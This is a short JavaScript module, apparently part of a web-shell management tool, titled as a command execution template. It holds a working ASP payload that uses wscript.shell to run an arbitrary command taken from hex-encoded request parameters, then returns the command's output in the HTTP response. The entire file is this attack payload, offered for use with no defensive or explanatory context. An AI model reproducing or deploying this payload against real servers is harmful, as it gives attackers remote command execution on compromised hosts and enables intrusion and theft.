/**
 * 命令执行模板
 */

module.exports = (arg1, arg2) => ({
  exec: {
    _:
      `Set X=CreateObject("wscript.shell").exec(""""&bd(Request("${arg1}"))&""" /c """&bd(Request("${arg2}"))&""""):If Err Then:S="[Err] "&Err.Description:Err.Clear:Else:O=X.StdOut.ReadAll():E=X.StdErr.ReadAll():S=O&E:End If:Response.write(S)`,
    [arg1]: "#{hex::bin}",
    [arg2]: "#{hex::cmd}"
  }
})
